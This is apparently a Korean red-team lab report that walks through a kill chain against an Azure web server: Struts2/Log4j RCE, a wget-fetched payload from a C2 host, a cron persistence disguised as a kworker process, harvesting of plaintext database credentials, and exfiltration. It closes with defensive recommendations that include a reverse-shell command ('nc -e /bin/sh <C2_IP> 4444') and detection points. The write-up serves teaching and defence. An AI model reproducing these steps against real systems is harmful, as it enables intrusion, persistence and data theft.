...
| **P4 (Low)** | **80** | **Apache 2.4.29** | 일반 웹 공격(SQLi, LFI) 시도 필요. 성공 확률은 상대적으로 낮고 시간이 소요됨. |
   ...
   ![Nmap](/assets/images/ckc/a/ckc.a.1.1.nmap.png)
...
단순 웹 취약점(SQLi, LFI)을 공략하는 것보다, **P1 등급으로 식별된 RCE 취약점(Struts2, Log4j)**을 이용하면 인증 과정 없이 즉시 시스템 권한을 탈취할 수 있다고 판단했다. 따라서 복잡한 웹 해킹 단계를 건너뛰고 **CVE 기반의 익스플로잇**을 최우선으로 수행하기로 전략을 수립했다.
   ...
   ![Gobuster](/assets/images/ckc/a/ckc.a.1.2.gobus.png)
...
제작된 무기는 `scp`를 이용해 Azure C2 서버로 암호화 전송되었으며, 웹 서버 루트(`/var/www/html`)에 배치하여 타겟이 `http://hamap.shop/genesis.elf` 주소를 통해 다운로드할 수 있도록 무기화했다.
   ...
   ![msfvenom](/assets/images/ckc/a/ckc.a.2.1.venom.png)
   ![scp](/assets/images/ckc/a/ckc.a.2.2.scp.png)
...
*   **Command Injection:** `wget`으로 C2 페이로드를 다운로드하고, `chmod`로 실행 권한을 부여한 뒤, 백그라운드(`&`)에서 실행하여 연결을 수립한다.
   ...
   ![struts2_exploit](/assets/images/ckc/a/ckc.a.2.3.struts.png)
...
이 구성은 방화벽이 특정 포트만 차단하는 경우를 우회하고, 공격 단계를 분리하여 성공률을 높이기 위함이다.
   ...
   ![marshalsec](/assets/images/ckc/a/ckc.a.2.4.mars.png)
...
*   **결과:** 타임아웃이 발생한 시점에 타겟 서버는 이미 백그라운드에서 C2 서버의 `genesis.elf`를 다운로드하고 실행 중인 상태이다.
   ...
   ![struts exploit](/assets/images/ckc/a/ckc.a.3.1.py.png)
...
이 로그는 방화벽 내부의 타겟 시스템이 **아웃바운드 통신을 시도**했으며, 악성 코드가 메모리 상으로 **성공적으로 반입(Delivery)되었음**을 증명하는 결정적인 증거이다.
   ...
   ![curl](/assets/images/ckc/a/ckc.a.3.2.curl.png)
   ![http](/assets/images/ckc/a/ckc.a.3.3.py.png)
...
```
   ...
   ![nc](/assets/images/ckc/a/ckc.a.4.1.nc.png)
...
2.  **컨테이너 환경 식별 (Containerization):**
   ...
   ![nc](/assets/images/ckc/a/ckc.a.4.2.nc.png)

---

#### 4.3. 탐지 및 방어 전략 (Detection & Mitigation)

이번 시나리오에서 공격이 성공할 수 있었던 원인을 심층 분석하고, 이를 차단하기 위한 구체적인 방어 대책을 수립한다.

**1. Azure NSG (Network Security Group) 정책 강화**
공격 성공의 가장 결정적인 요인은 **아웃바운드(Outbound) 트래픽에 대한 통제 부재**였다.

*   **가설 (Hypothesis):** 만약 Azure NSG에서 외부로 나가는 `Port 4444`를 차단했다면?
*   **결과 (Result):** 공격자가 웹 서버 장악 후 `nc -e /bin/sh <C2_IP> 4444`를 실행하더라도, 방화벽(NSG)단에서 패킷이 **드랍(Drop)**되어 리버스 쉘 연결 자체가 성립되지 않는다.
*   **권고 (Recommendation):** 서버 팜(Server Farm)의 아웃바운드 정책은 편의를 위한 '모두 허용(Allow Any)'이 아닌, 필수 포트(OS 업데이트용 80/443, DB용 3306 등)만 허용하는 **화이트리스트(Whitelist)** 방식으로 운영해야 한다.

**2. 로그 분석 및 시각화 (Log Analysis)**
Azure Monitor 또는 Sentinel(SIEM)을 활용하면 공격 흐름을 다음과 같이 탐지할 수 있다. 공격 허용 시와 차단 시의 로그 패턴 차이는 아래 다이어그램과 같다.

```mermaid
sequenceDiagram
    autonumber
    
    participant WebServer as "🖥️ 웹 서버 (피해자)<br>(10.0.1.4)"
    participant NSG as "🛡️ Azure NSG<br>(방화벽)"
    participant C2 as "🥷 공격자 C2<br>(20.214.x.x)"
    participant Log as "📝 Azure Sentinel<br>(보안 관제)"

    Note over WebServer: "공격자 명령 실행:<br>nc <C2_IP> 4444"
    WebServer->>NSG: "[Outbound] TCP SYN (Port 4444)"
    
    rect rgb(45, 10, 10)
        Note right of WebServer: 🔴 [Case 1] 정책: 모두 허용 (Allow Any)
        NSG->>C2: [패킷 전달] 연결 성공
        C2-->>WebServer: [Handshake] 리버스 쉘 생성
        NSG->>Log: "Action: Allow" 로그 기록
        Note right of Log: 🚨 이상 징후 탐지 실패<br>(정상 통신으로 간주)
    end
    
    rect rgb(10, 20, 45)
        Note right of WebServer: 🔵 [Case 2] 정책: 화이트리스트 (Deny All)
        NSG--xC2: 🚫 [패킷 차단] 연결 실패 (Drop)
        NSG->>Log: "Action: Deny" 로그 기록
        Note right of Log: ✅ 보안 알림 발생:<br>"비정상 아웃바운드 차단됨"
    end
```

> **[SIEM 로그 예시: 차단 성공 시]**
> *   **Time:** 2025-11-21 14:32:11
> *   **SrcIP:** 10.0.1.4 (Web Server)
> *   **DestIP:** 20.214.245.185 (Attacker C2)
> *   **DestPort:** 4444 (비인가 포트)
> *   **Action:** **Deny (Inbound/Outbound Rules)**

위와 같이 NSG 로그를 모니터링한다면, **"웹 서버가 업무와 무관한 4444번 포트로 외부 통신을 시도함"**이라는 명확한 침해 지표(IoC)를 식별하고 즉각적인 대응이 가능하다.

**3. 프로세스 계보 분석 (Process Ancestry)**
*   **탐지 포인트:** 웹 애플리케이션 프로세스(Java, Tomcat, Node.js 등)가 셸(`/bin/sh`, `/bin/bash`)을 자식 프로세스로 생성하거나, 네트워크 도구(`nc`, `curl`, `wget`)를 직접 실행하는 행위는 100% 악성 행위로 간주해야 한다.
*   **EDR 대응:** 부모 프로세스가 `java`인 경우, 자식 프로세스로 셸이 실행되는 것을 원천 차단하는 정책을 적용한다.

**4. 컨테이너 보안 강화 (Container Security)**
*   **최소 권한 원칙 (Root 구동 금지):** Dockerfile 내에 `USER 1000`과 같이 비특권 사용자를 명시하여, 애플리케이션이 해킹되더라도 호스트 시스템의 Root 권한까지 탈취당하지 않도록 제한해야 한다.
    ```dockerfile
    # Dockerfile Security Best Practice
    RUN addgroup -S appgroup && adduser -S appuser -G appgroup
    USER appuser
    ```
*   **읽기 전용 파일 시스템 (Read-Only FS):** 컨테이너의 파일 시스템을 `Read-Only`로 설정하여, 공격자가 악성 도구(Payload)를 다운로드하거나 실행 권한(`chmod +x`)을 변경하는 행위를 무력화해야 한다.

**5. 아웃바운드 통제 (Egress Filtering)**
*   **문제점:** 내부망(Private Subnet) 서버가 인터넷상의 임의의 IP/포트로 자유롭게 접속 가능한 환경이 C2 연결의 근본 원인이다.
*   **해결책:** Azure Firewall 또는 Network Policy를 활용하여, OS 업데이트 저장소나 특정 API 호출 등 **업무에 필수적인 도메인 외의 모든 트래픽을 차단(Default Deny)**해야 한다.

### 📝 결론 (Conclusion)

공격자는 애플리케이션의 취약점을 악용하여 **Root 권한의 셸**을 획득하는 데 성공했다. 이는 단순한 코드 레벨의 취약점을 넘어, **컨테이너 런타임 보안 설정의 미흡함**과 **네트워크 접근 제어(Egress)의 실패**가 복합적으로 작용한 결과이다.

방어자는 **"침해는 언제든 발생할 수 있다"**는 전제하에, 공격이 발생하더라도 외부로 데이터가 유출되거나 C2 서버와 연결되지 않도록 **심층 방어(Defense in Depth)** 체계를 구축해야 한다.
...
1.  **[Masquerading]** 악성 페이로드(`genesis.elf`)를 탐지가 어려운 시스템 경로(`/usr/local/bin/`)로 이동시키고, 이름을 정상적인 시스템 프로세스인 것처럼 **`kworker_sys`**로 변경하여 관리자의 육안 검사를 회피했다.
    ...
    ```
    ![elf](/assets/images/ckc/a/ckc.a.5.1.elf.png)
...
2.  **[Persistence]** 1분마다 해당 바이너리가 실행되도록 Crontab에 등록했다. 이로써 연결이 끊기더라도 최대 1분 내에 C2 세션이 복구된다.
    ...
    ```
    ![elf](/assets/images/ckc/a/ckc.a.5.2.elf.png)
...
2.  **트래픽 위장:** 모든 C2 트래픽은 일반적인 웹 서핑 트래픽(HTTPS)으로 보이며, 패킷 내부의 데이터는 암호화되어 있어 보안 장비가 내용을 감청할 수 없다.
   ...
   ![c2](/assets/images/ckc/a/ckc.a.5.3.c2.png)
...
1.  **환경 변수 분석:** 컨테이너 내부에서 `env` 명령어를 실행하여 DB 접속 정보를 식별했다.
    ...
    ```
    ![env](/assets/images/ckc/a/ckc.a.6.1.env.png)

2.  **구성 파일 탐색:** 웹 애플리케이션 소스 코드(`/var/www/html/config.php`)에서도 동일한 평문 자격 증명이 발견되었다.

    ![pass](/assets/images/ckc/a/ckc.a.6.2.pass.png)
...
*   **의미:** DMZ(웹) 구간과 내부망(DB) 구간 사이의 **네트워크 분리(Segmentation)가 미흡**하며, 웹 서버에서 DB 포트로의 접근이 방화벽으로 통제되지 않고 있다.
   ...
   ![db](/assets/images/ckc/a/ckc.a.6.3.db.png)
...
2.  **Exfiltration:** C2 채널을 통해 공격자의 Azure 서버로 파일 전송.
   ...
   ![log](/assets/images/ckc/a/ckc.a.6.4.log.png)
...
1.  **[Credential Dumping]** 웹 애플리케이션 설정 파일에서 하드코딩된 DB 자격 증명을 식별했다.
    ...
    ![pass](/assets/images/ckc/a/ckc.a.7.1.pass.png)
2.  **[Lateral Movement]** 획득한 정보를 바탕으로 Python 원라이너(One-liner) 스크립트를 사용하여 내부 DB 서버(10.0.2.15:3306)와의 연결을 확인했다. 이는 **"Living off the Land (LotL)"** 기법으로, 별도의 해킹 툴 설치 없이 기본 설치된 언어(Python)만으로 공격을 수행하여 탐지를 회피한 것이다.
   ...
   ![db](/assets/images/ckc/a/ckc.a.7.2.db.png)
...
HTTPS(443) 포트를 사용한 암호화된 C2 채널을 통했기 때문에, 네트워크 경계 보안 장비(Firewall/IPS)는 이를 단순한 웹 트래픽으로 인식하여 차단하지 못했다.
   ...
   ![dump](/assets/images/ckc/a/ckc.a.7.3.dump.png)
